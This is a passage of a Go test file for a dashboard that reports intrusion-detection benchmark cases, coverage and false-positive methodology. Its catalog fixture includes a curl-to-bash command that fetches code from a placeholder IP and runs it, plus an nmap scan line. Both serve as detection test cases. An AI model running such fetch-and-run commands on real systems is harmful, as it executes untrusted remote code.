package main

import (
	"bytes"
	"encoding/json"
	"html/template"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"testing"
)

func renderPage(t *testing.T, page string, d *Data) string {
	t.Helper()
	tmpl, err := template.New("").Funcs(funcMap).ParseFS(assets, "templates/*.html")
	if err != nil {
		t.Fatalf("parse templates: %v", err)
	}
	var buf bytes.Buffer
	pd := PageData{Data: d, Title: "test", Active: "scores", Scores: buildScoresView(d.Runs, false)}
	if err := tmpl.ExecuteTemplate(&buf, page, pd); err != nil {
		t.Fatalf("execute %s: %v", page, err)
	}
	return buf.String()
}

func f64(v float64) *float64 { return &v }

func demoRun(synthetic bool) Run {
	return Run{
		RunID: "demo-001", Product: "demo-hids", Timestamp: "2026-11-19T00:00:00Z",
		Synthetic: synthetic,
		Meta: RunMeta{
			CorpusSHA256: "abc123", Calibre: "v2.2", RunKind: "COMPLETE",
			TargetKernel: "5.99-test", TargetDistro: "Test OS 7", Host: "selftest",
		},
		Totals: Totals{Cases: 8, FP: 2, Attack: 6},
		Detection: Detection{
			Detectable: 4, Hit: 3, Strict: 2, Anyhit: 3, Notrun: 1,
			SignalRate: f64(0.75), StrictRate: f64(0.5), AnyhitRate: f64(0.75),
		},
		FP: FP{Evaluable: 2, Legacy: 2, Violations: 1, AttemptRate: f64(0.5), VerifiedRate: nil},
		PerClass: []RunClassRow{
			{Class: "net_scan_external", Cases: 1, Detected: 1, Missed: 0, MedianLatencyMs: f64(500), TechTagged: 1},
			{Class: "net_recon_local", Cases: 1, Detected: 0, Missed: 1, MedianLatencyMs: nil, TechTagged: 0},
		},
	}
}

// The shipped corpus has zero real-machine runs, so the scores page must show
// the pending placeholder and never a score or a demo badge.
func TestScoresEmptyPlaceholder(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Meta: Meta{Calibre: "v2.2"}, Runs: []Run{}})
	for _, want := range []string{"Pending real-machine measurement", "0 runs"} {
		if !strings.Contains(out, want) {
			t.Errorf("empty scores page missing %q", want)
		}
	}
	if strings.Contains(out, "demo-badge") {
		t.Error("empty scores page must not render a SYNTHETIC DEMO badge")
	}
}

// A synthetic run must be unmistakably labelled and still render the score
// framework (rates, N/A for empty denominators, per-class table).
func TestScoresSyntheticRunLabelled(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Runs: []Run{demoRun(true)}})
	for _, want := range []string{"demo-badge", "SYNTHETIC DEMO", "demo-hids", "75%", "N/A", "net_scan_external", "500"} {
		if !strings.Contains(out, want) {
			t.Errorf("synthetic run page missing %q", want)
		}
	}
}

// A real (non-synthetic) run renders scores WITHOUT the demo badge.
func TestScoresRealRunNoBadge(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Runs: []Run{demoRun(false)}})
	if strings.Contains(out, "demo-badge") {
		t.Error("real run must not carry a SYNTHETIC DEMO badge")
	}
	if !strings.Contains(out, "demo-hids") {
		t.Error("real run page missing product name")
	}
}

// An incomplete run must be disclosed as not publishable.
func TestScoresInterruptedDisclosed(t *testing.T) {
	r := demoRun(false)
	r.Meta.RunKind = "INTERRUPTED"
	out := renderPage(t, "scores.html", &Data{Runs: []Run{r}})
	if !strings.Contains(out, "not a complete, publishable run") {
		t.Error("INTERRUPTED run must be disclosed as not publishable")
	}
}

// The statistical methodology panel and the G3 tier palette/semantic axis are
// framework-ready: they render even with zero runs, so the honesty disclosure
// is live before any real-machine measurement exists.
func TestScoresMethodologyAndTierLegend(t *testing.T) {
	out := renderPage(t, "scores.html", &Data{Meta: Meta{Calibre: "v2.2"}, Runs: []Run{}})
	for _, want := range []string{
		"Statistical methodology", "Clopper-Pearson", "Independence limitation",
		"No total score", "Precision versus false-positive rate",
		"More specific", "Less specific", "tier-technique", "tier-tactic",
		"tier-general", "tier-none",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("empty scores page missing methodology/legend %q", want)
		}
	}
}

// The /fp page renders the benign distribution, the tight-window methodology
// and the tradeoff with zero runs, and keeps the violation table an honest
// empty state (no synthetic badge on the committed artifact).
func TestFPPageEmptyState(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)
	code, body := getBody(t, s, "/fp")
	if code != 200 {
		t.Fatalf("/fp status = %d, want 200", code)
	}
	for _, want := range []string{
		"Benign corpus distribution", "benign_ops_devbuild", "benign_ops_sysadmin",
		"/case?id=FP01", "Tight-window FP methodology", "2500", "fp-uid",
		"bin_found=0", "fetch.complete", "Calibre A tradeoff", "FALSE POSITIVE", "CALDERA",
		"No real-machine run yet.",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("/fp missing %q", want)
		}
	}
	if strings.Contains(body, "demo-badge") {
		t.Error("committed /fp must not render a SYNTHETIC DEMO badge")
	}
	if strings.Contains(body, "Wazuh 4.14.10") {
		t.Error("public /fp must not publish real product measurement numbers")
	}
	_, zh := getBody(t, s, "/fp?lang=zh")
	if !strings.Contains(zh, "紧窗误报方法论") || !strings.Contains(zh, "良性语料分布") {
		t.Error("zh /fp must render Chinese headings")
	}
}

// A synthetic run activates the /fp violation table and is labelled SYNTHETIC.
func TestFPPageSyntheticRun(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	d.Runs = []Run{demoRun(true)}
	s := testServer(t, d)
	_, body := getBody(t, s, "/fp")
	for _, want := range []string{"Real-machine FP violations", "demo-badge", "demo-hids", "50%"} {
		if !strings.Contains(body, want) {
			t.Errorf("synthetic /fp missing %q", want)
		}
	}
	if strings.Contains(body, "No real-machine run yet.") {
		t.Error("synthetic /fp must drop the empty state")
	}
}

// A real run renders the /fp violation table without the demo badge.
func TestFPPageRealRunNoBadge(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	d.Runs = []Run{demoRun(false)}
	s := testServer(t, d)
	_, body := getBody(t, s, "/fp")
	if strings.Contains(body, "demo-badge") {
		t.Error("real run /fp must not carry a SYNTHETIC DEMO badge")
	}
	if !strings.Contains(body, "demo-hids") {
		t.Error("real run /fp missing product name")
	}
}

// buildFPView splits the census by group and reconciles the subtotals and the
// bar maximum; an empty census gives exact zeros, never a hollow pass.
func TestBuildFPView(t *testing.T) {
	rows := []BenignRow{
		{Subfamily: "benign_ops_devbuild", Group: "form", Cases: 17},
		{Subfamily: "benign_ops_logs", Group: "form", Cases: 8},
		{Subfamily: "benign_ops_sysadmin", Group: "persona", Cases: 8},
		{Subfamily: "benign_ops_dev", Group: "persona", Cases: 7},
	}
	v := buildFPView(rows)
	if len(v.FormRows) != 2 || len(v.PersonaRows) != 2 {
		t.Fatalf("group split = %d/%d, want 2/2", len(v.FormRows), len(v.PersonaRows))
	}
	if v.FormTotal != 25 || v.PersonaTotal != 15 || v.Total != 40 {
		t.Errorf("totals = %d/%d/%d, want 25/15/40", v.FormTotal, v.PersonaTotal, v.Total)
	}
	if v.MaxCases != 17 {
		t.Errorf("max = %d, want 17", v.MaxCases)
	}
	e := buildFPView(nil)
	if e.Total != 0 || e.MaxCases != 0 || len(e.FormRows) != 0 {
		t.Errorf("empty census = %+v, want zeros", e)
	}
}

// The census banner distinguishes coverage (a corpus census) from a product
// detection rate on both the overview and coverage pages, in both languages.
func TestCensusBanner(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)
	for _, page := range []string{"/", "/coverage"} {
		code, body := getBody(t, s, page)
		if code != 200 {
			t.Fatalf("%s status = %d, want 200", page, code)
		}
		if !strings.Contains(body, "Coverage is not a detection rate.") {
			t.Errorf("%s missing census banner", page)
		}
		if !strings.Contains(body, "no single total score") {
			t.Errorf("%s census banner must disclaim a total score", page)
		}
	}
	_, body := getBody(t, s, "/coverage?lang=zh")
	if !strings.Contains(body, "覆盖不是检出率") {
		t.Error("zh coverage must render the Chinese census banner")
	}
}

func TestFmtNullable(t *testing.T) {
	if got := fmtRate(nil); got != "N/A" {
		t.Errorf("fmtRate(nil) = %q, want N/A", got)
	}
	if got := fmtRate(f64(0.75)); got != "75%" {
		t.Errorf("fmtRate(0.75) = %q, want 75%%", got)
	}
	if got := fmtMs(nil); got != "–" {
		t.Errorf("fmtMs(nil) = %q, want dash", got)
	}
	if got := fmtMs(f64(500)); got != "500" {
		t.Errorf("fmtMs(500) = %q, want 500", got)
	}
}

// The committed artifact must parse and stay honest: empty runs, real totals.
func TestLoadCommittedData(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	if len(d.Runs) != 0 {
		t.Errorf("shipped dashboard_data.json must have empty runs, got %d", len(d.Runs))
	}
	if d.Totals.Cases != 1076 || d.Totals.Classes != 52 {
		t.Errorf("committed totals drift: %+v", d.Totals)
	}
	if len(d.TechniqueHeatmap) != d.Meta.TechniquesCovered {
		t.Error("heatmap count != meta.techniques_covered")
	}
}

func TestI18nFallbackAndLang(t *testing.T) {
	if got := translate("en", "Overview"); got != "Overview" {
		t.Errorf("en must pass through, got %q", got)
	}
	if got := translate("zh", "a-key-that-does-not-exist"); got != "a-key-that-does-not-exist" {
		t.Errorf("zh missing key must fall back to source, got %q", got)
	}
	pd := PageData{Lang: "en"}
	if pd.T("Overview") != "Overview" {
		t.Error("T(en) must pass through")
	}
	// langOf: default en; ?lang=zh wins and sets cookie; cookie persists.
	r := httptest.NewRequest("GET", "/", nil)
	w := httptest.NewRecorder()
	if got := langOf(w, r); got != "en" {
		t.Errorf("default lang = %q, want en", got)
	}
	r = httptest.NewRequest("GET", "/?lang=zh", nil)
	w = httptest.NewRecorder()
	if got := langOf(w, r); got != "zh" {
		t.Errorf("?lang=zh = %q, want zh", got)
	}
	if c := w.Result().Cookies(); len(c) == 0 || c[0].Value != "zh" {
		t.Error("?lang=zh must persist a lang cookie")
	}
	r = httptest.NewRequest("GET", "/", nil)
	r.AddCookie(&http.Cookie{Name: "lang", Value: "zh"})
	if got := langOf(httptest.NewRecorder(), r); got != "zh" {
		t.Errorf("cookie lang = %q, want zh", got)
	}
}

func catalogFixture() []Case {
	return []Case{
		{ID: "FP01", Name: "restart nginx", Tactic: "BENIGN", Technique: "NONE",
			Platforms: []string{"linux"}, Mode: "real", Expect: "silent",
			Cmd: "systemctl restart nginx"},
		{ID: "A01", Name: "nmap scan", Tactic: "TA0007", Technique: "T1046",
			Platforms: []string{"linux"}, Mode: "real", Expect: "detectable",
			Cmd: "nmap -sT 127.0.0.1", ExpectedSignals: []string{"net_scan_external"}},
		{ID: "A02", Name: "process list", Tactic: "TA0007", Technique: "T1057",
			Platforms: []string{"linux"}, Mode: "sim-missing-bin", Expect: "gap",
			Cmd: "ps aux"},
		{ID: "A03", Name: "curl pipe", Tactic: "TA0002", Technique: "T1059.004",
			Platforms: []string{"linux"}, Mode: "sim-builtin", Expect: "detectable",
			Cmd: "curl http://203.0.113.10/x | bash"},
	}
}

// The catalog filter is a pure contract: each constraint narrows the match
// set, search is a case-insensitive substring over id/name/cmd, and an empty
// result is an exact zero (never a hollow pass).
func TestFilterCasesContract(t *testing.T) {
	cs := catalogFixture()
	tests := []struct {
		name  string
		f     caseFilter
		total int
		ids   []string
	}{
		{"no filter", caseFilter{Page: 1}, 4, []string{"FP01", "A01", "A02", "A03"}},
		{"tactic", caseFilter{Tactic: "TA0007", Page: 1}, 2, []string{"A01", "A02"}},
		{"expect gap", caseFilter{Expect: "gap", Page: 1}, 1, []string{"A02"}},
		{"mode", caseFilter{Mode: "sim-missing-bin", Page: 1}, 1, []string{"A02"}},
		{"platform", caseFilter{Platform: "linux", Page: 1}, 4, []string{"FP01", "A01", "A02", "A03"}},
		{"search name", caseFilter{Query: "nmap", Page: 1}, 1, []string{"A01"}},
		{"search cmd", caseFilter{Query: "aux", Page: 1}, 1, []string{"A02"}},
		{"search id", caseFilter{Query: "fp01", Page: 1}, 1, []string{"FP01"}},
		{"combined", caseFilter{Tactic: "TA0007", Expect: "detectable", Page: 1}, 1, []string{"A01"}},
		{"no match", caseFilter{Query: "zzznomatch", Page: 1}, 0, nil},
	}
	for _, tt := range tests {
		rows, total, pages, page := filterCases(cs, tt.f)
		if total != tt.total {
			t.Errorf("%s: total = %d, want %d", tt.name, total, tt.total)
		}
		if len(rows) != tt.total {
			t.Errorf("%s: page rows = %d, want %d (single page)", tt.name, len(rows), tt.total)
		}
		if pages < 1 || page < 1 {
			t.Errorf("%s: pages/page must be >=1, got %d/%d", tt.name, pages, page)
		}
		for i, id := range tt.ids {
			if i >= len(rows) || rows[i].ID != id {
				t.Errorf("%s: row %d = %v, want %s", tt.name, i, rows, id)
				break
			}
		}
	}
}

// Pagination slices 50 per page in corpus order and clamps an over-range page
// to the last page instead of returning empty or panicking.
func TestFilterCasesPagination(t *testing.T) {
	cs := make([]Case, 120)
	for i := range cs {
		cs[i] = Case{ID: "C" + strconv.Itoa(i), Tactic: "TA0002", Expect: "detectable",
			Platforms: []string{"linux"}, Mode: "real"}
	}
	rows, total, pages, page := filterCases(cs, caseFilter{Page: 1})
	if total != 120 || pages != 3 || page != 1 || len(rows) != 50 {
		t.Fatalf("page1 = total %d pages %d page %d rows %d, want 120/3/1/50", total, pages, page, len(rows))
	}
	if rows[0].ID != "C0" || rows[49].ID != "C49" {
		t.Errorf("page1 bounds = %s..%s, want C0..C49", rows[0].ID, rows[49].ID)
	}
	rows, _, _, page = filterCases(cs, caseFilter{Page: 3})
	if page != 3 || len(rows) != 20 || rows[0].ID != "C100" {
		t.Errorf("page3 = page %d rows %d first %s, want 3/20/C100", page, len(rows), rows[0].ID)
	}
	rows, _, _, page = filterCases(cs, caseFilter{Page: 99})
	if page != 3 || len(rows) != 20 {
		t.Errorf("over-range page must clamp to last: page %d rows %d, want 3/20", page, len(rows))
	}
}

func testServer(t *testing.T, d *Data) *server {
	t.Helper()
	tmpl, err := template.New("").Funcs(funcMap).ParseFS(assets, "templates/*.html")
	if err != nil {
		t.Fatalf("parse templates: %v", err)
	}
	return &server{data: d, tmpl: tmpl}
}

func getBody(t *testing.T, s *server, target string) (int, string) {
	t.Helper()
	w := httptest.NewRecorder()
	s.routes().ServeHTTP(w, httptest.NewRequest("GET", target, nil))
	return w.Code, w.Body.String()
}

// The /cases page renders through the real mux with the committed corpus:
// full count, filter narrowing, search, pagination, and the empty result.
func TestCasesPageHTTP(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)

	code, body := getBody(t, s, "/cases")
	if code != 200 {
		t.Fatalf("/cases status = %d, want 200", code)
	}
	for _, want := range []string{"1076", "FP01", "<form", "name=\"tactic\"", "name=\"q\""} {
		if !strings.Contains(body, want) {
			t.Errorf("/cases missing %q", want)
		}
	}

	_, body = getBody(t, s, "/cases?expect=gap")
	if !strings.Contains(body, ">21<") || strings.Contains(body, "FP01") {
		t.Error("expect=gap must show 21 matches and exclude benign FP01")
	}

	_, body = getBody(t, s, "/cases?tactic=BENIGN")
	if !strings.Contains(body, ">120<") {
		t.Error("tactic=BENIGN must show 120 matches")
	}

	_, body = getBody(t, s, "/cases?q=nmap")
	if !strings.Contains(body, "nmap") {
		t.Error("q=nmap must render matching cases")
	}

	// Search is case-insensitive: the boundary lowercases the query.
	_, upper := getBody(t, s, "/cases?q=NMAP")
	if !strings.Contains(upper, "nmap") {
		t.Error("q=NMAP must match the same cases as q=nmap")
	}

	_, body = getBody(t, s, "/cases?q=zzznomatch")
	if !strings.Contains(body, "No cases match the current filter.") {
		t.Error("no-match search must render the empty-row message")
	}

	_, body = getBody(t, s, "/cases?page=2")
	if strings.Contains(body, ">FP01<") {
		t.Error("page 2 must not repeat the first case FP01")
	}

	_, body = getBody(t, s, "/cases?lang=zh")
	if !strings.Contains(body, "案目录") || !strings.Contains(body, "筛选") {
		t.Error("zh catalog must render Chinese UI")
	}
}

// The committed catalog reconciles with the pinned corpus totals and carries
// the public-safe cmd plus the fields the detail page needs.
func TestCommittedCatalog(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	if len(d.Cases) != 1076 {
		t.Fatalf("catalog count = %d, want 1076", len(d.Cases))
	}
	byID := map[string]Case{}
	for _, c := range d.Cases {
		byID[c.ID] = c
	}
	fp := byID["FP01"]
	if fp.Expect != "silent" || fp.Tactic != "BENIGN" || fp.Technique != "NONE" || fp.TechniqueName != "" {
		t.Errorf("FP01 benign shape wrong: %+v", fp)
	}
	var gap, silent int
	for _, c := range d.Cases {
		if c.Cmd == "" {
			t.Errorf("case %s has empty cmd", c.ID)
		}
		switch c.Expect {
		case "gap":
			gap++
			if len(c.ExpectedSignals) != 0 {
				t.Errorf("gap case %s must have no expected signals", c.ID)
			}
		case "silent":
			silent++
		}
	}
	if gap != 21 || silent != 120 {
		t.Errorf("gap/silent = %d/%d, want 21/120", gap, silent)
	}
	for _, r := range d.ClassDistribution {
		if len(r.Anchors) == 0 || r.Counterpart == "" {
			t.Errorf("class %s missing anchors/counterpart", r.Class)
		}
	}
}

// The /case detail page renders the four sections through the real mux:
// ATT&CK link, cmd, signal-class anchors + counterpart, and the contribution
// entry. gap and benign cases are disclosed honestly; a missing id is 404.
func TestCaseDetailHTTP(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)

	code, body := getBody(t, s, "/case?id=E01")
	if code != 200 {
		t.Fatalf("/case?id=E01 status = %d, want 200", code)
	}
	for _, want := range []string{
		"attack.mitre.org/techniques/T1059.004/", "curl", "download_and_execute",
		"Sigma curl pipe shell", contributeURL,
		"1. ATT&amp;CK mapping", "2. Command &amp; execution",
		"3. Expected signals", "4. Detection &amp; contribution",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("E01 detail missing %q", want)
		}
	}

	_, body = getBody(t, s, "/case?id=S01")
	if !strings.Contains(body, "gap — no signal class") || !strings.Contains(body, contributeURL) {
		t.Error("gap case must disclose the coverage hole and link the contribution entry")
	}

	_, body = getBody(t, s, "/case?id=FP01")
	if !strings.Contains(body, "silent") || !strings.Contains(body, "BENIGN") {
		t.Error("benign case must show silent + BENIGN")
	}

	_, body = getBody(t, s, "/case?id=FP09")
	for _, want := range []string{"archive_staging", "T1074.001", "Sigma data compressed", "Related signals"} {
		if !strings.Contains(body, want) {
			t.Errorf("FP09 related-signal section missing %q", want)
		}
	}

	if code, _ := getBody(t, s, "/case?id=NOPE"); code != 404 {
		t.Errorf("unknown id status = %d, want 404", code)
	}
	if code, _ := getBody(t, s, "/case"); code != 404 {
		t.Errorf("missing id status = %d, want 404", code)
	}

	_, body = getBody(t, s, "/case?id=E01&lang=zh")
	if !strings.Contains(body, "命令与执行") || !strings.Contains(body, "期望信号") {
		t.Error("zh detail must render Chinese section headings")
	}
}

// The /case detection evidence section renders the expected detection profile
// (adapter rules), the G3 tier legend and the scorer per-case follow-up with
// zero runs; benign and gap cases are handled honestly.
func TestCaseEvidenceHTTP(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)
	_, body := getBody(t, s, "/case?id=E01")
	for _, want := range []string{
		"5. Detection evidence", "Expected detection profile",
		"exec-curl-pipe-shell", "execve argv", "tier-technique",
		"scorer --out-json", "/scores",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("E01 evidence missing %q", want)
		}
	}
	_, fp01 := getBody(t, s, "/case?id=FP01")
	if !strings.Contains(fp01, "Benign case: a correct HIDS") || !strings.Contains(fp01, `href="/fp"`) {
		t.Error("benign case evidence must link the FP methodology")
	}
	_, s01 := getBody(t, s, "/case?id=S01")
	if !strings.Contains(s01, "no adapter mapping applies") {
		t.Error("gap case evidence must disclose no adapter mapping")
	}
	_, zh := getBody(t, s, "/case?id=E01&lang=zh")
	if !strings.Contains(zh, "检测证据") || !strings.Contains(zh, "期望检测剖面") {
		t.Error("zh case evidence must render Chinese headings")
	}
}

// A synthetic run activates the /case class-level evidence table for the
// case's expected classes, labelled SYNTHETIC, with the G3 tier split. The
// rows are class aggregates, never invented per-case observations.
func TestCaseEvidenceSynthetic(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	r := demoRun(true)
	r.PerClass = []RunClassRow{
		{Class: "download_and_execute", Cases: 10, Detected: 8, Missed: 2,
			HitCI95: []*float64{f64(0.5), f64(0.95)}},
	}
	r.Tiers = Tiers{
		Totals: map[string]int{"technique": 8, "tactic": 2, "general": 0, "none": 0},
		PerClass: []TierClassRow{
			{Class: "download_and_execute", Technique: 6, Tactic: 2, General: 0, None: 0},
		},
	}
	d.Runs = []Run{r}
	s := testServer(t, d)
	_, body := getBody(t, s, "/case?id=E01")
	for _, want := range []string{
		"Class-level detection from runs", "download_and_execute", "demo-badge",
		"80%", "6/2/0/0",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("synthetic E01 evidence missing %q", want)
		}
	}
}

// tierFor resolves a class to its tier row (nil when absent); hasStr is the
// membership predicate the evidence table filters on.
func TestTierForAndHasStr(t *testing.T) {
	rows := []TierClassRow{{Class: "a", Technique: 1}, {Class: "b", Tactic: 2}}
	if got := tierFor(rows, "a"); got == nil || got.Technique != 1 {
		t.Errorf("tierFor(a) = %+v, want technique 1", got)
	}
	if got := tierFor(rows, "zzz"); got != nil {
		t.Errorf("tierFor(zzz) = %+v, want nil", got)
	}
	if !containsStr([]string{"a", "b"}, "b") || containsStr([]string{"a"}, "z") {
		t.Error("hasStr (containsStr) membership wrong")
	}
}

// The matrix page carries a real gap -> contribution CTA (uncovered techniques
// link the public issues) and the Navigator layer semantics legend.
func TestMatrixCTAAndLegend(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)
	code, body := getBody(t, s, "/matrix")
	if code != 200 {
		t.Fatalf("/matrix status = %d, want 200", code)
	}
	for _, want := range []string{
		contributeURL, "Uncovered techniques", "625", "propose a case", "T1001",
		"Navigator layer semantics", "score", "comment",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("/matrix missing %q", want)
		}
	}
}

// The uncovered list reconciles with the matrix: covered + uncovered = total,
// and the two sets are disjoint (no technique both covered and uncovered).
func TestUncoveredReconcile(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	if len(d.Uncovered) != 625 {
		t.Errorf("uncovered count = %d, want 625", len(d.Uncovered))
	}
	if len(d.TechniqueHeatmap)+len(d.Uncovered) != d.Meta.MatrixTechniques {
		t.Errorf("covered %d + uncovered %d != matrix %d",
			len(d.TechniqueHeatmap), len(d.Uncovered), d.Meta.MatrixTechniques)
	}
	covered := map[string]bool{}
	for _, r := range d.TechniqueHeatmap {
		covered[r.TechniqueID] = true
	}
	for _, r := range d.Uncovered {
		if covered[r.TechniqueID] {
			t.Errorf("technique %s both covered and uncovered", r.TechniqueID)
		}
		if r.Name == "" {
			t.Errorf("uncovered technique %s has empty name", r.TechniqueID)
		}
	}
}

// The committed class distribution carries the P0 denominator transparency:
// an expect breakdown (detectable/gap/silent) and a mode breakdown
// (real/sim-missing-bin/sim-builtin) that each reconcile to the class case
// count, so a reader sees how much of each class is evaluable on a bare bench.
func TestCommittedClassBreakdown(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	aggMode := map[string]int{}
	for _, r := range d.ClassDistribution {
		eb := r.ExpectBreakdown
		if eb["detectable"]+eb["gap"]+eb["silent"] != r.Cases {
			t.Errorf("class %s expect_breakdown %v != cases %d", r.Class, eb, r.Cases)
		}
		if eb["detectable"] != r.Detectable || eb["gap"] != r.Gap {
			t.Errorf("class %s expect_breakdown disagrees with detectable/gap", r.Class)
		}
		if eb["silent"] != 0 {
			t.Errorf("class %s has silent members %d (benign cases carry no class)", r.Class, eb["silent"])
		}
		mb := r.ModeBreakdown
		if mb["real"]+mb["sim-missing-bin"]+mb["sim-builtin"] != r.Cases {
			t.Errorf("class %s mode_breakdown %v != cases %d", r.Class, mb, r.Cases)
		}
		for k, v := range mb {
			aggMode[k] += v
		}
	}
	want := map[string]int{"real": 538, "sim-missing-bin": 286, "sim-builtin": 111}
	for k, v := range want {
		if aggMode[k] != v {
			t.Errorf("aggregate mode %s = %d, want %d", k, aggMode[k], v)
		}
	}
}

// The committed benign distribution reconciles with the family registry: 20
// benign_ops_* subfamilies, 120 cases split form 55 / persona 65, each count
// matching the registry, representatives drawn from the catalog.
func TestBenignDistributionReconcile(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	bd := d.BenignDistribution
	if len(bd) != 20 {
		t.Fatalf("benign subfamilies = %d, want 20", len(bd))
	}
	reg := map[string]int{}
	regGroup := map[string]string{}
	raw, err := os.ReadFile("../data/family-registry.tsv")
	if err != nil {
		t.Fatalf("read registry: %v", err)
	}
	for _, line := range strings.Split(string(raw), "\n") {
		if strings.HasPrefix(line, "#") || strings.TrimSpace(line) == "" {
			continue
		}
		p := strings.Split(strings.TrimRight(line, "\r"), "\t")
		if len(p) < 3 || p[2] != "benign" {
			continue
		}
		reg[p[1]]++
		n, _ := strconv.Atoi(p[0][2:])
		g := "persona"
		if n <= 56 {
			g = "form"
		}
		if prev, ok := regGroup[p[1]]; ok && prev != g {
			t.Errorf("subfamily %s spans groups", p[1])
		}
		regGroup[p[1]] = g
	}
	catIDs := map[string]bool{}
	for _, c := range d.Cases {
		catIDs[c.ID] = true
	}
	var total, form, persona int
	seen := map[string]bool{}
	for _, r := range bd {
		total += r.Cases
		if r.Group == "form" {
			form += r.Cases
		} else {
			persona += r.Cases
		}
		seen[r.Subfamily] = true
		if !strings.HasPrefix(r.Subfamily, "benign_ops_") {
			t.Errorf("subfamily %s missing benign_ops_ prefix", r.Subfamily)
		}
		if r.Cases != reg[r.Subfamily] {
			t.Errorf("subfamily %s count %d != registry %d", r.Subfamily, r.Cases, reg[r.Subfamily])
		}
		if regGroup[r.Subfamily] != r.Group {
			t.Errorf("subfamily %s group %s != registry %s", r.Subfamily, r.Group, regGroup[r.Subfamily])
		}
		if len(r.Examples) < 1 || len(r.Examples) > 3 {
			t.Errorf("subfamily %s examples len %d, want 1..3", r.Subfamily, len(r.Examples))
		}
		for _, id := range r.Examples {
			if !catIDs[id] {
				t.Errorf("subfamily %s example %s not in catalog", r.Subfamily, id)
			}
		}
	}
	if total != 120 || total != d.Totals.FP {
		t.Errorf("benign total %d (fp %d), want 120", total, d.Totals.FP)
	}
	if form != 55 || persona != 65 {
		t.Errorf("form/persona = %d/%d, want 55/65", form, persona)
	}
	for sub := range reg {
		if !seen[sub] {
			t.Errorf("registry subfamily %s absent from distribution", sub)
		}
	}
}

// The committed per-class adapter rules reconcile with the adapter mapping
// tables (xiezhi seed names, wazuh native ids + execve classifier counts).
func TestAdapterRulesReconcile(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	readMap := func(path string) map[string]string {
		raw, err := os.ReadFile(path)
		if err != nil {
			t.Fatalf("read %s: %v", path, err)
		}
		var m map[string]string
		if err := json.Unmarshal(raw, &m); err != nil {
			t.Fatalf("parse %s: %v", path, err)
		}
		return m
	}
	xzBy, wzBy := map[string][]string{}, map[string][]string{}
	for rule, cls := range readMap("../adapters/xiezhi/rule_map.json") {
		xzBy[cls] = append(xzBy[cls], rule)
	}
	for rule, cls := range readMap("../adapters/wazuh/rule_map.json") {
		wzBy[cls] = append(wzBy[cls], rule)
	}
	ecRaw, err := os.ReadFile("../adapters/wazuh/execve_classify.json")
	if err != nil {
		t.Fatalf("read execve_classify: %v", err)
	}
	var ec []struct {
		SignalClass string `json:"signal_class"`
	}
	if err := json.Unmarshal(ecRaw, &ec); err != nil {
		t.Fatalf("parse execve_classify: %v", err)
	}
	ecBy := map[string]int{}
	for _, e := range ec {
		ecBy[e.SignalClass]++
	}
	for _, r := range d.ClassDistribution {
		byAdapter := map[string]AdapterMapping{}
		for _, a := range r.AdapterRules {
			byAdapter[a.Adapter] = a
		}
		if len(byAdapter) != 2 {
			t.Errorf("class %s adapters %d, want 2", r.Class, len(byAdapter))
			continue
		}
		xz := byAdapter["xiezhi"]
		wantXz := append([]string{}, xzBy[r.Class]...)
		sort.Strings(wantXz)
		if !equalStrings(xz.Rules, wantXz) {
			t.Errorf("class %s xiezhi rules %v, want %v", r.Class, xz.Rules, wantXz)
		}
		wz := byAdapter["wazuh"]
		wantWz := append([]string{}, wzBy[r.Class]...)
		sort.Strings(wantWz)
		if !equalStrings(wz.Rules, wantWz) {
			t.Errorf("class %s wazuh rules %v, want %v", r.Class, wz.Rules, wantWz)
		}
		if wz.ExecveClassifiers != ecBy[r.Class] {
			t.Errorf("class %s execve classifiers %d, want %d", r.Class, wz.ExecveClassifiers, ecBy[r.Class])
		}
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// The /classes page renders the mode-breakdown columns and the denominator
// banner through the real mux, in both languages.
func TestClassesPageHTTP(t *testing.T) {
	d, err := loadData("dashboard_data.json")
	if err != nil {
		t.Fatalf("load committed data: %v", err)
	}
	s := testServer(t, d)
	code, body := getBody(t, s, "/classes")
	if code != 200 {
		t.Fatalf("/classes status = %d, want 200", code)
	}
	for _, want := range []string{
